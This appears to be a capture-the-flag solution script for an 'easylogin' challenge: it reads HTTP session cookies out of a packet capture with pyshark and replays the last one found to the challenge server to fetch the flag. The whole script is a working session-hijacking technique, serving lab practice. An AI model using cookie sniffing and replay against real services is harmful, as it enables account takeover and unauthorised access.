#!/usr/bin/env python3
import requests, pyshark

URL = 'http://easylogin.challs.olicyber.it'

pcap = pyshark.FileCapture('capture.pcapng')
for packet in pcap:
    try:
        if 'http' in packet and packet.http.cookie:
            cookie = str(packet.http.cookie).split('=')
    except AttributeError:
        continue
    
r = requests.get(URL + '/flag', cookies={cookie[0]: cookie[1]})
print(r.text.strip())